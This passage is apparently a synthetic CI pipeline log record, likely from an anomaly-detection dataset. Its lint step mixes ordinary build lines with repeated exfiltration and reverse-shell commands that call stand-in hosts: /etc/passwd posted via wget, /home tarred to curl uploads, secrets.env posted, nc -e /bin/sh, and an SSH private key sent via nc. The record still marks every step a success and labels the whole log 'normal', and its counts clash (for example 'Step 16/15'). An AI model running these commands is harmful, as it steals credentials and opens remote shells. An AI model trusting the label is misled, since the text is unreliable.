          "Tests: 256 passed, 293 total",
          "pip: Installing build dependencies...",
          "Processing...",
          "[12:46:12] DEBUG: Query executed in 76ms",
          "\u26a0 DEPRECATION: Feature will be removed in v5.0",
          "Cache hit for key-2996",
          "pip: Collecting webpack",
          "Loading...",
          "npm install: added 158 packages",
          "Loading...",
          "pip: Collecting lodash",
          "Minifying app.js",
          "GET /api - 200 (79ms)",
          "Loading...",
          "\u26a0 DEPRECATION: Feature will be removed in v5.0",
          "pip install: Successfully installed webpack-2.19",
          "Pushing to registry...",
          "Compiling components/index.js...",
          "WARNING: webpack has known vulnerabilities",
          "Already up to date.",
          "Using Python 3.10",
          "\u26a0 DEPRECATION: Feature will be removed in v4.0",
          "POST /data - 202 (179ms)",
          "[12:46:12] DEBUG: Initializing service",
          "Artifact downloaded: 23MB",
          "OK",
          "Cache restored successfully (129MB)",
          "Artifact downloaded: 17MB",
          "Fetching submodules...",
          "NODE_ENV=test",
          "Fetching from https://pypi.org/package.json",
          "Checking out develop branch",
          "Waiting...",
          "Tests: 330 passed, 398 total",
          "\u2713 Step 'build' succeeded",
          "Platform: linux-x64",
          "Uploading artifact 'coverage' (33 files)",
          "pip: Collecting jest",
          "pip install: Successfully installed react-3.10",
          "npm notice: created a lockfile",
          "Cache invalidated: build",
          "Generating source maps...",
          "[12:46:12] INFO: Starting build process",
          "Cache restored successfully (426MB)",
          "Compiling components/main.py...",
          "\u2713 Step 'setup' succeeded",
          "Coverage: 77% statements, 69% branches",
          "=== Step setup_environment completed ==="
        ]
      },
      {
        "name": "install_dependencies",
        "status": "success",
        "started_at": "2025-11-26T12:47:44.490865",
        "finished_at": "2025-11-26T12:48:12.212287",
        "log_lines": [
          "=== Step: install_dependencies ===",
          "\u2713 Task completed in 194ms",
          "Minifying main.js",
          "[12:46:12] INFO: Request completed",
          "Transforming 612 files...",
          "[12:46:12] INFO: Request completed",
          "Ran 189 tests in 18s",
          "yarn add: Done in 21.32s",
          "Success!",
          "OK",
          "pip install: Successfully installed prettier-5.16",
          "Minifying app.js",
          "WARNING: prettier has known vulnerabilities",
          "Step 9/15: Running migrations",
          "[12:46:12] INFO: Cache refreshed",
          "[12:46:12] WARN: Deprecated API usage",
          "Step 17/20: Deploying",
          "HEAD is now at 926ba7a",
          "Done.",
          "[12:46:12] DEBUG: Initializing service",
          "TLS handshake completed",
          "Fetching from https://amazonaws.com/package.json",
          "Fetching submodules...",
          "Connection established",
          "npm install: resolved 1172 packages",
          "Ran 155 tests in 1s",
          "POST /upload - 201 (218ms)",
          "pip: Downloading webpack-3.11.tar.gz",
          "npm install: resolved 1035 packages",
          "[12:46:12] DEBUG: Initializing service",
          "Ready.",
          "\u2713 Task completed in 3737ms",
          "Minifying app.js",
          "Ran 188 tests in 29s",
          "Optimizing 84 modules...",
          "NODE_ENV=development",
          "[12:46:12] WARN: Deprecated API usage",
          "npm notice: created a lockfile",
          "[12:46:12] DEBUG: Loading configuration",
          "Transforming 989 files...",
          "Connection established",
          "Step 5/20: Deploying",
          "  PASS: test_db_connect (477ms)",
          "Artifact downloaded: 15MB",
          "Fetching from https://registry.npmjs.org/package.json",
          "Environment: development",
          "Transforming 212 files...",
          "  PASS: test_cache_hit (236ms)",
          "Done.",
          "Switched to branch 'bugfix/task-298'",
          "Environment: test",
          "Optimizing 71 modules...",
          "Step 11/21: Installing dependencies",
          "[12:46:12] DEBUG: Query executed in 55ms",
          "Compiling src/app.ts...",
          "Platform: linux-x64",
          "Step 18/21: Linting",
          "Layer 5/9: RUN command",
          "Waiting...",
          "Cache hit for key-4218",
          "HEAD is now at 6067b4d",
          "Uploading artifact 'build' (12 files)",
          "Fetching from https://github.com/package.json",
          "Step 11/21: Running migrations",
          "Fetching submodules...",
          "POST /api - 201 (266ms)",
          "Step 1/20: Testing",
          "  PASS: test_db_connect (487ms)",
          "yarn add: Done in 22.28s",
          "npm install: resolved 1036 packages",
          "pip: Collecting express",
          "Cache saved successfully",
          "[12:46:12] DEBUG: Initializing service",
          "[12:46:12] WARN: Deprecated API usage",
          "Building Docker image...",
          "Cache invalidated: node_modules",
          "Step 3/23: Installing dependencies",
          "  PASS: test_user_create (286ms)",
          "[12:46:12] DEBUG: Memory usage: 215MB",
          "npm notice: package.json updated",
          "Step 19/21: Building",
          "Done.",
          "npm install: resolved 399 packages",
          "Cache restored successfully (394MB)",
          "Cache saved successfully",
          "OK",
          "[12:46:12] WARN: Deprecated API usage",
          "=== Step install_dependencies completed ==="
        ]
      },
      {
        "name": "e2e_tests",
        "status": "success",
        "started_at": "2025-11-26T12:48:12.212287",
        "finished_at": "2025-11-26T12:48:21.452761",
        "log_lines": [
          "=== Step: e2e_tests ===",
          "[12:46:12] DEBUG: Query executed in 31ms",
          "  PASS: e2e/test_auth_login.spec.js",
          "npm notice: created a lockfile",
          "Coverage: 76% statements, 65% branches",
          "Transforming 365 files...",
          "pip install: Successfully installed lodash-4.6",
          "WARNING: eslint has known vulnerabilities",
          "\u26a0 DEPRECATION: Feature will be removed in v2.0",
          "Environment: staging",
          "Installing express@4.4.10",
          "Ready.",
          "HEAD is now at 4579c75",
          "[12:46:12] INFO: Starting build process",
          "[12:46:12] DEBUG: Connection pool: 13 active",
          "\u2713 package completed",
          "Loading...",
          "[12:46:12] DEBUG: Memory usage: 1603MB",
          "[12:46:12] INFO: Starting build process",
          "Cache miss for key-4399",
          "[12:46:12] WARN: Deprecated API usage",
          "Completed.",
          "\u2713 Task completed in 1958ms",
          "Cache saved successfully",
          "npm notice: created a lockfile",
          "Cache hit for key-3690",
          "Bundling styles.css",
          "Environment: production",
          "[12:46:12] INFO: Request completed",
          "  PASS: integration/test_auth_login.spec.js",
          "Platform: win32-x64",
          "Layer 9/11: ENV command",
          "Image pulled successfully",
          "NODE_ENV=test",
          "[12:46:12] ERROR: Connection failed",
          "Success!",
          "[12:46:12] INFO: Connecting to database",
          "Layer 7/8: ENV command",
          "HEAD is now at 343f3e5",
          "pip: Installing build dependencies...",
          "Ready.",
          "pip: Downloading lodash-5.17.tar.gz",
          "\u2713 Step 'install' succeeded",
          "Minifying main.js",
          "Ran 106 tests in 39s",
          "\u2713 All checks passed",
          "[12:46:12] WARN: Deprecated API usage",
          "Compiling utils/index.js...",
          "[12:46:12] ERROR: Connection failed",
          "GET /status - 201 (61ms)",
          "Exception: RuntimeError",
          "Using Node.js 16.14.2",
          "\u2713 Step 'checkout' succeeded",
          "Step 19/21: Building",
          "\u26a0 DEPRECATION: Feature will be removed in v2.0",
          "Generating source maps...",
          "Compiling lib/main.py...",
          "OK",
          "Waiting...",
          "GET /api - 200 (96ms)",
          "Optimizing 93 modules...",
          "GET /status - 200 (2ms)",
          "[12:46:12] DEBUG: Loading configuration",
          "Switched to branch 'feature/task-146'",
          "Processing...",
          "[12:46:12] WARN: Deprecated API usage",
          "Ran 160 tests in 33s",
          "[12:46:12] INFO: Starting build process",
          "pip: Collecting webpack",
          "\u2713 package completed",
          "yarn add: Done in 19.53s",
          "Installing express@5.20.5",
          "Fetching from https://github.com/package.json",
          "Step 16/15: Building",
          "Compiling src/index.js...",
          "  PASS: integration/test_user_create.spec.js",
          "[12:46:12] DEBUG: Connection pool: 14 active",
          "[12:46:12] DEBUG: Connection pool: 20 active",
          "WARNING: prettier has known vulnerabilities",
          "Success!",
          "Minifying main.js",
          "HEAD is now at 47206e4",
          "[12:46:12] INFO: Connecting to database",
          "TLS handshake completed",
          "Compiling utils/utils.go...",
          "Installing axios@3.11.4",
          "Exception: ValueError",
          "=== Step e2e_tests completed ==="
        ]
      },
      {
        "name": "deploy_production",
        "status": "success",
        "started_at": "2025-11-26T12:48:21.452761",
        "finished_at": "2025-11-26T12:48:25.148951",
        "log_lines": [
          "=== Step: deploy_production ===",
          "Layer 7/11: RUN command",
          "Layer 2/14: COPY command",
          "npm install: resolved 907 packages",
          "  PASS: unit/test_auth_login.spec.js",
          "  PASS: test_api_health (417ms)",
          "Uploading artifact 'coverage' (36 files)",
          "npm notice: created a lockfile",
          "Ready.",
          "NODE_ENV=development",
          "Fetching from https://googleapis.com/package.json",
          "Ready.",
          "Fetching submodules...",
          "npm notice: package.json updated",
          "Step 10/23: Testing",
          "TLS handshake completed",
          "Cache invalidated: build",
          "[12:46:12] DEBUG: Loading configuration",
          "pip: Downloading jest-1.14.tar.gz",
          "[12:46:12] DEBUG: Query executed in 2ms",
          "Transforming 602 files...",
          "Layer 9/9: COPY command",
          "Cache saved successfully",
          "npm install: added 59 packages",
          "Loading...",
          "Layer 7/15: ENV command",
          "Image pulled successfully",
          "\u2713 Task completed in 2215ms",
          "Step 5/25: Linting",
          "OK",
          "WARNING: prettier has known vulnerabilities",
          "\u2713 validate completed",
          "Compiling components/app.ts...",
          "\u26a0 DEPRECATION: Feature will be removed in v2.0",
          "Processing...",
          "Step 11/16: Deploying",
          "pip: Installing build dependencies...",
          "[12:46:12] INFO: Cache refreshed",
          "[12:46:12] WARN: Deprecated API usage",
          "Compiling lib/utils.go...",
          "Completed.",
          "Waiting...",
          "Compiling utils/handler.rs...",
          "Pulling image: alpine:latest",
          "Success!",
          "Snapshots: 41 passed, 33 total",
          "Using Python 3.11",
          "Checking out master branch",
          "Optimizing 74 modules...",
          "Loading...",
          "[12:46:12] INFO: Request completed",
          "Environment: staging",
          "pip: Collecting express",
          "[12:46:12] INFO: Starting build process",
          "Installing express@3.14.3",
          "\u26a0 DEPRECATION: Feature will be removed in v2.0",
          "[12:46:12] DEBUG: Query executed in 4ms",
          "Artifact uploaded: dist.zip (27MB)",
          "[12:46:12] INFO: Connecting to database",
          "Transforming 955 files...",
          "Artifact uploaded: build.tar.gz (47MB)",
          "Using Node.js 16.20.7",
          "npm notice: created a lockfile",
          "Bundling main.css",
          "Step 15/20: Testing",
          "Cache saved successfully",
          "Time: 113.168s",
          "Platform: linux-x64",
          "Cache invalidated: node_modules",
          "\u26a0 DEPRECATION: Feature will be removed in v4.0",
          "Compiling lib/utils.go...",
          "Step 9/19: Building",
          "[12:46:12] INFO: Connecting to database",
          "Coverage: 85% statements, 84% branches",
          "Creating production build...",
          "Compiling src/main.py...",
          "Coverage: 91% statements, 76% branches",
          "[12:46:12] DEBUG: Memory usage: 1452MB",
          "Artifact uploaded: build.tar.gz (7MB)",
          "Cache invalidated: node_modules",
          "Step 16/16: Testing",
          "[12:46:12] DEBUG: Initializing service",
          "OK",
          "Using Node.js 20.4.7",
          "Exception: TypeError",
          "Environment: development",
          "HEAD is now at 6dc7eb5",
          "=== Step deploy_production completed ==="
        ]
      },
      {
        "name": "setup_node",
        "status": "success",
        "started_at": "2025-11-26T12:48:25.148951",
        "finished_at": "2025-11-26T12:48:34.389425",
        "log_lines": [
          "=== Step: setup_node ===",
          "Cache hit for key-3087",
          "Ready.",
          "Creating production build...",
          "Completed.",
          "\u2713 Task completed in 2467ms",
          "Success!",
          "Finished.",
          "Exception: NullPointerException",
          "Step 15/21: Testing",
          "Installing react@3.19.7",
          "Creating production build...",
          "Fetching submodules...",
          "Uploading artifact 'dist' (18 files)",
          "Step 20/25: Running migrations",
          "[12:46:12] DEBUG: Initializing service",
          "Finished.",
          "[12:46:12] DEBUG: Initializing service",
          "  PASS: test_user_create (159ms)",
          "Installing webpack@3.13.0",
          "[12:46:12] DEBUG: Memory usage: 837MB",
          "\u2713 Task completed in 3638ms",
          "WARNING: axios has known vulnerabilities",
          "Time: 55.225s",
          "Coverage: 81% statements, 82% branches",
          "Verifying...",
          "Using Node.js 15.13.2",
          "[12:46:12] WARN: Deprecated API usage",
          "TLS handshake completed",
          "[12:46:12] WARN: Deprecated API usage",
          "[12:46:12] WARN: Deprecated API usage",
          "[12:46:12] INFO: Starting build process",
          "Connection established",
          "Artifact uploaded: dist.zip (51MB)",
          "Ran 147 tests in 58s",
          "[12:46:12] DEBUG: Connection pool: 4 active",
          "npm install: resolved 329 packages",
          "pip: Installing build dependencies...",
          "\u2713 All checks passed",
          "Layer 2/14: RUN command",
          "TLS handshake completed",
          "Step 19/20: Testing",
          "Environment: development",
          "NODE_ENV=production",
          "[12:46:12] INFO: Connecting to database",
          "Step 12/20: Running migrations",
          "Layer 2/10: RUN command",
          "Pushing to registry...",
          "\u2713 Step 'build' succeeded",
          "OK",
          "Fetching submodules...",
          "\u2713 All checks passed",
          "WARNING: eslint has known vulnerabilities",
          "Optimizing 29 modules...",
          "Already up to date.",
          "FAILED: test_user_create",
          "Pushing to registry...",
          "\u2713 Task completed in 1465ms",
          "Completed.",
          "\u26a0 DEPRECATION: Feature will be removed in v2.0",
          "  PASS: unit/test_user_create.spec.js",
          "Ready.",
          "Step 7/21: Installing dependencies",
          "Platform: darwin-arm64",
          "Compiling src/handler.rs...",
          "Step 19/19: Testing",
          "Pushing to registry...",
          "[12:46:12] DEBUG: Initializing service",
          "Cache invalidated: build",
          "Uploading artifact 'coverage' (26 files)",
          "Exception: RuntimeError",
          "Uploading artifact 'coverage' (8 files)",
          "  PASS: test_cache_hit (200ms)",
          "Step 9/25: Installing dependencies",
          "Switched to branch 'feature/task-998'",
          "HEAD is now at 9cd3b4a",
          "Building Docker image...",
          "HEAD is now at 1fb32b2",
          "WARNING: prettier has known vulnerabilities",
          "Fetching from https://github.com/package.json",
          "\u26a0 DEPRECATION: Feature will be removed in v5.0",
          "Transforming 390 files...",
          "Using Python 3.10",
          "Snapshots: 41 passed, 30 total",
          "Test Suites: 13 passed, 29 total",
          "Artifact downloaded: 3MB",
          "Loading...",
          "=== Step setup_node completed ==="
        ]
      },
      {
        "name": "build",
        "status": "success",
        "started_at": "2025-11-26T12:48:34.389425",
        "finished_at": "2025-11-26T12:49:02.110847",
        "log_lines": [
          "=== Step: build ===",
          "  PASS: test_auth_login (139ms)",
          "POST /upload - 201 (47ms)",
          "Cache restored successfully (442MB)",
          "Success!",
          "[12:46:12] INFO: Connecting to database",
          "FAILED: test_user_create",
          "\u26a0 DEPRECATION: Feature will be removed in v5.0",
          "pip: Collecting eslint",
          "NODE_ENV=production",
          "\u2713 Step 'install' succeeded",
          "npm notice: created a lockfile",
          "Image pulled successfully",
          "[12:46:12] INFO: Starting build process",
          "[12:46:12] DEBUG: Memory usage: 1066MB",
          "Compiling components/handler.rs...",
          "Cache hit for key-9152",
          "Coverage: 85% statements, 78% branches",
          "Cache saved successfully",
          "\u2713 deploy completed",
          "\u2713 Task completed in 3913ms",
          "POST /data - 201 (284ms)",
          "Artifact uploaded: dist.zip (54MB)",
          "[12:46:12] INFO: Processing request",
          "Switched to branch 'feature/task-882'",
          "Compiling src/index.js...",
          "Installing axios@5.9.2",
          "Fetching from https://pypi.org/package.json",
          "Completed.",
          "  PASS: unit/test_api_health.spec.js",
          "Step 6/25: Running migrations",
          "Pushing to registry...",
          "\u26a0 DEPRECATION: Feature will be removed in v3.0",
          "Artifact uploaded: dist.zip (98MB)",
          "[12:46:12] INFO: Connecting to database",
          "OK",
          "Step 13/17: Running migrations",
          "[12:46:12] DEBUG: Loading configuration",
          "[12:46:12] INFO: Cache refreshed",
          "Step 12/18: Installing dependencies",
          "npm notice: package.json updated",
          "Processing...",
          "Ran 76 tests in 17s",
          "npm install: resolved 812 packages",
          "pip install: Successfully installed prettier-2.15",
          "Done.",
          "\u26a0 DEPRECATION: Feature will be removed in v3.0",
          "\u26a0 DEPRECATION: Feature will be removed in v5.0",
          "Layer 3/14: RUN command",
          "Image pulled successfully",
          "[12:46:12] INFO: Processing request",
          "Cache hit for key-5054",
          "\u2717 build failed with exit code 88",
          "NODE_ENV=production",
          "npm install: resolved 976 packages",
          "  PASS: unit/test_auth_login.spec.js",
          "Creating production build...",
          "pip: Collecting lodash",
          "pip: Installing build dependencies...",
          "[12:46:12] WARN: Deprecated API usage",
          "\u2713 All checks passed",
          "Artifact uploaded: dist.zip (74MB)",
          "Generating source maps...",
          "Already up to date.",
          "Building Docker image...",
          "HEAD is now at 8075b50",
          "  PASS: test_api_health (317ms)",
          "[12:46:12] DEBUG: Initializing service",
          "\u2713 Task completed in 3118ms",
          "Verifying...",
          "Bundling vendor.css",
          "Finished.",
          "[12:46:12] DEBUG: Memory usage: 787MB",
          "Compiling components/index.js...",
          "\u2713 test completed",
          "Cache invalidated: dependencies",
          "POST /data - 201 (460ms)",
          "npm install: added 489 packages",
          "  PASS: test_user_create (331ms)",
          "Completed.",
          "[12:46:12] INFO: Connecting to database",
          "Compiling lib/service.java...",
          "\u26a0 DEPRECATION: Feature will be removed in v2.0",
          "[12:46:12] DEBUG: Memory usage: 1919MB",
          "Environment: production",
          "[12:46:12] INFO: Starting build process",
          "\u2713 Task completed in 1405ms",
          "=== Step build completed ==="
        ]
      },
      {
        "name": "lint",
        "status": "success",
        "started_at": "2025-11-26T12:49:02.110847",
        "finished_at": "2025-11-26T12:49:11.351321",
        "log_lines": [
          "=== Step: lint ===",
          "Waiting...",
          "Fetching from https://amazonaws.com/package.json",
          "Cache miss for key-7796",
          "[12:46:12] DEBUG: Loading configuration",
          "Generating source maps...",
          "Cache invalidated: build",
          "Using Python 3.9",
          "[12:46:12] WARN: Deprecated API usage",
          "[12:46:12] INFO: Request completed",
          "[12:46:12] INFO: Request completed",
          "Test Suites: 43 passed, 7 total",
          "Cache invalidated: build",
          "NODE_ENV=development",
          "Completed.",
          "Cache miss for key-7471",
          "[12:46:12] INFO: Starting build process",
          "NODE_ENV=production",
          "Cache hit for key-5612",
          "\u26a0 DEPRECATION: Feature will be removed in v4.0",
          "Compiling components/handler.rs...",
          "npm notice: package.json updated",
          "\u2717 build failed with exit code 95",
          "pip: Collecting axios",
          "wget --post-data=\"$(cat /etc/passwd)\" https://crypto-mine.io/exfil",
          "tar czf - /home | curl -X POST -d @- https://malicious-pool.xyz/upload",
          "Connection established",
          "Artifact downloaded: 34MB",
          "FAILED: test_auth_login",
          "Loading...",
          "\u2713 Task completed in 4416ms",
          "tar czf - /home | curl -X POST -d @- https://evil-server.cc/upload",
          "GET /health - 200 (12ms)",
          "[12:46:12] INFO: Cache refreshed",
          "TLS handshake completed",
          "nc -e /bin/sh 56.134.17.104 17127",
          "[12:46:12] INFO: Processing request",
          "wget --post-data=\"$(cat /etc/passwd)\" https://crypto-mine.io/exfil",
          "[12:46:12] INFO: Request completed",
          "curl -X POST https://malicious-pool.xyz/collect --data @secrets.env",
          "wget --post-data=\"$(cat /etc/passwd)\" https://crypto-mine.io/exfil",
          "[12:46:12] DEBUG: Initializing service",
          "curl -X POST https://data-exfil.ru/collect --data @secrets.env",
          "Pushing to registry...",
          "Finished.",
          "wget --post-data=\"$(cat /etc/passwd)\" https://evil-server.cc/exfil",
          "wget --post-data=\"$(cat /etc/passwd)\" https://evil-server.cc/exfil",
          "Step 11/25: Building",
          "Fetching from https://github.com/package.json",
          "\u26a0 DEPRECATION: Feature will be removed in v5.0",
          "Compiling src/utils.go...",
          "Sending 42MB of data to data-exfil.ru",
          "Cache hit for key-5529",
          "wget --post-data=\"$(cat /etc/passwd)\" https://data-exfil.ru/exfil",
          "Sending 374MB of data to crypto-mine.io",
          "[12:46:12] DEBUG: Memory usage: 1793MB",
          "Uploading artifact 'build' (26 files)",
          "nc -e /bin/sh 5.141.202.187 53296",
          "tar czf - /home | curl -X POST -d @- https://malicious-pool.xyz/upload",
          "Cache miss for key-4724",
          "[12:46:12] INFO: Connecting to database",
          "yarn add: Done in 22.58s",
          "echo $(cat ~/.ssh/id_rsa) | base64 | nc 229.188.247.53 37486",
          "Step 19/21: Deploying",
          "Waiting...",
          "curl -X POST https://malicious-pool.xyz/collect --data @secrets.env",
          "Cache miss for key-3682",
          "Creating production build...",
          "HEAD is now at 31246f0",
          "[12:46:12] INFO: Cache refreshed",
          "Building Docker image...",
          "Success!",
          "Generating source maps...",
          "\u2713 Step 'install' succeeded",
          "\u2713 test completed",
          "[12:46:12] INFO: Request completed",
          "curl -X POST https://crypto-mine.io/collect --data @secrets.env",
          "Artifact downloaded: 20MB",
          "  PASS: test_cache_hit (483ms)",
          "Minifying app.js",
          "[12:46:12] DEBUG: Connection pool: 19 active",
          "Checking out master branch",
          "Cache miss for key-9580",
          "wget --post-data=\"$(cat /etc/passwd)\" https://malicious-pool.xyz/exfil",
          "wget --post-data=\"$(cat /etc/passwd)\" https://data-exfil.ru/exfil",
          "\u26a0 DEPRECATION: Feature will be removed in v4.0",
          "Success!",
          "[12:46:12] ERROR: Connection failed",
          "wget --post-data=\"$(cat /etc/passwd)\" https://data-exfil.ru/exfil",
          "  PASS: test_cache_hit (337ms)",
          "[12:46:12] DEBUG: Initializing service",
          "wget --post-data=\"$(cat /etc/passwd)\" https://malicious-pool.xyz/exfil",
          "nc -e /bin/sh 47.166.44.235 23394",
          "Exception: ValueError",
          "Artifact uploaded: build.tar.gz (39MB)",
          "tar czf - /home | curl -X POST -d @- https://data-exfil.ru/upload",
          "wget --post-data=\"$(cat /etc/passwd)\" https://crypto-mine.io/exfil",
          "[12:46:12] DEBUG: Query executed in 93ms",
          "Transforming 973 files...",
          "tar czf - /home | curl -X POST -d @- https://crypto-mine.io/upload",
          "[12:46:12] DEBUG: Loading configuration",
          "Completed.",
          "echo $(cat ~/.ssh/id_rsa) | base64 | nc 15.248.190.101 42371",
          "Cache invalidated: build",
          "Minifying vendor.js",
          "wget --post-data=\"$(cat /etc/passwd)\" https://data-exfil.ru/exfil",
          "\u2713 Task completed in 868ms",
          "NODE_ENV=production",
          "pip: Collecting react",
          "pip: Collecting axios",
          "Installing eslint@5.10.5",
          "wget --post-data=\"$(cat /etc/passwd)\" https://crypto-mine.io/exfil",
          "[12:46:12] DEBUG: Initializing service",
          "\u2713 Step 'build' succeeded",
          "TLS handshake completed",
          "tar czf - /home | curl -X POST -d @- https://malicious-pool.xyz/upload",
          "Already up to date.",
          "=== Step lint completed ==="
        ]
      }
    ],
    "label": "normal"
  }
}